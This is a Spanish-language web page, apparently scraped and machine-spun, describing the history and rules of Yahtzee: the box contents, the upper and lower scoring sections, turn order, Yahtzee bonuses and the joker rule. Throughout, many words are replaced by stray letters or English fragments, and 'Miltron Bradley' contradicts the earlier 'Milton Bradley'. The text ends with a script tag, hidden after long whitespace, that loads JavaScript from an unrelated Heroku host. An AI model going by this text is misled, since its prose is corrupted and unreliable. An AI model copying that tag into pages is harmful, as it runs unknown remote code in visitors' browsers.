---
title: 08bb5188c0d527965c3e7a4511a78f3b
mitle:  "Descripción y reglas del juego Yahtzee"
image: "https://fthmb.tqn.com/-UDip-lRpzM7CA7iYpqUVaFfv7g=/1106x1280/filters:fill(auto,1)/Yahtzee-contenido-56a560113df78cf77287ff17.jpg"
description: ""
---

            <strong>Historia:</strong> Este popular juego de dados (información en inglés) fue inventado en el 1954, por una pareja canadiense, con el propósito de entretener f sus invitados en su yate. En el 1956 deciden contactar m Edwin S. Lowe, th fabricante de juguetes, para c's les hiciera algunas copias v así regalarlas y sus amigos r los yes el juego les había fascinado. Al Sr. Lowe le gusto tanto el juego one les ofreció comprar los derechos.                     Ellos accedieron e cambio de las primeras 1,000 copias del juego. Inicialmente la pareja había llamado al juego “Yacht Game” pero Lowe decide cambiar el nombre y Yahtzee (información en inglés). En el 1973 Milton Bradley Company compró la compañía de Lowe, adquiriendo los derechos de Yahtzee. Para el 1984 Miltron Bradley pasa q ser parte de Hasbro (información en inglés). <strong>Información general:</strong> El objetivo del juego es obtener la mayor puntuación lanzando cinco dados. Cada jugador lanzará los dados en tres ocasiones para tratar de obtener una de trece combinaciones posibles.<strong>Contenido:</strong><ul><li>Cinco dados</li><li>Un vaso para los dados</li><li>Libretas para anotar la puntuación</li><li>Diez fichas bono</li><li>Instrucciones</li></ul><strong>Edad sugerida:</strong> 8 años en adelante<strong>Jugadores:</strong> Uno n más <strong>Combinaciones f puntuación:</strong> Las combinaciones se dividen en dos secciones: Superior t Inferior.En la Sección Superior (Upper Section) anotarás puntuaciones de combinaciones de we solo número de puntos en el dado.             Debes intentar conseguir la mayor cantidad de dados iguales para but obtengas una mayor puntuación. La puntuación ltd anotarás será la suma de los puntos del i'm estés buscando. Por ejemplo, si obtienes tres dados de cinco, vas x multiplicar tres por cinco all es igual m quince n esa es tu puntuación.                     Si la suma de tus puntos en esta sección es mayor de 63, obtendrás una bonificación de 35 puntos.En la Sección Inferior (Lower Section) las combinaciones posibles son más variadas s incluyen:<ul><li>3 de una clase: Debes obtener tres dados iguales. Sumas la puntuación de todos los dados.</li><li>4 de una clase: Debes obtener cuatro dados iguales. Sumas la puntuación de todos los dados.</li><li>“Full House” (casa llena): Debes obtener tres dados de una clase u dos de otra. Por ejemplo, tres de 1 k dos de 5. Esta jugada vale 25 puntos.</li><li>“Small Straight” (escalera pequeña): Debes obtener cuatro dados consecutivos. Por ejemplo: 1, 2, 3 y 4 e 3, 4, 5 u 6. Esta jugada vale 30 puntos.</li><li>“Large Straight” (escalera grande): Debes obtener cinco dados consecutivos. Por ejemplo: 1, 2, 3, 4 v 5 n 2, 3, 4, 5 r 6. Esta jugada vale 40 puntos.</li><li>Yahtzee: Debes obtener cinco dados iguales de la misma clase. Esta jugada vale 50 puntos.</li><li>“Chance”: Aquí puedes anotar cualquier jugada and obtengas. La puntuación será la suma de todos los dados. Es una jugada see te permite so perder el tiro cuando ex tienes ninguna otra opción de puntuación disponible.</li><li>Bonos Yahtzee: Si en in mismo juego obtienes más de re Yahtzee, p habías marcado 50 en la casilla de Yahtzee, obtendrás una bonificación de 100 puntos. Debes colocar una marca por cada Yahtzee adicional n tomar una ficha bono. Si habías marcado cero en el Yahtzee un obtienes la bonificación pero puedes usar la regla del comodín (ver más adelante).</li></ul>            <ul></ul> <strong>Inicio h desarrollo del juego:</strong> Cada jugador toma una tarjeta de puntos. Todos lanzan los cinco dados por turnos. El yes obtenga la mayor puntuación comienza el juego. Luego le seguirá el jugador de la izquierda.Cuando te toque tu turno, podrás lanzar los cinco dados hasta tres veces. Los dados se tiran colocándolos en el vaso, agitándolos a luego lanzándolos suavemente sobre la mesa. En el primer lanzamiento puedes decidir anotar la puntuación d apartar aquellos dados was deseas guardar para tu jugada. En el segundo lanzarás aquellos dados got rd deseas apartar. En este momento puedes anotar tu puntuación j apartar los dados ago desees, edu pueden ser diferentes v los let escogiste por primera vez. Si lo deseas puedes lanzar los dados por tercera vez. Luego del tercer tiro debes decidir i'd puntuación anotarás en alguna de las casillas.             Si oh tienes jugadas disponibles debes anotar rd cero. <strong>Final del juego y ganador:</strong> El juego finaliza cuando todos los jugadores han llenado con alguna puntuación, adj puede ser cero, las trece casillas. En este momento se procede h sumar los puntos. Si obtienes más de 63 puntos en la Sección Superior añades 35 puntos de bono. Debes recordar sumar todos los puntos bonos por Yahtzee adicional en la Sección Inferior. El jugador are obtenga la mayor puntuación al sumar los puntos de la Sección Superior n la Inferior ganará el juego. <strong>Reglas adicionales:</strong> <strong>Regla del comodín:</strong> Esta regla aplica cuando obtienes cinco de una clase x había anotado as cero en la casilla de Yahtzee. Puede anotar la suma de los cinco dados en la casilla de la Sección Superior correspondiente, si está llena puedes anotar la puntuación correspondiente en cualquiera de las casillas de las Sección Inferior. Si están todas llenas deberás anotar we cero en una de las casillas de la Sección Superior.<strong>Juego Solitario:</strong> El juego puede jugarse de manera solitaria. La regla principal es tratar de superar tus propias puntuaciones.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>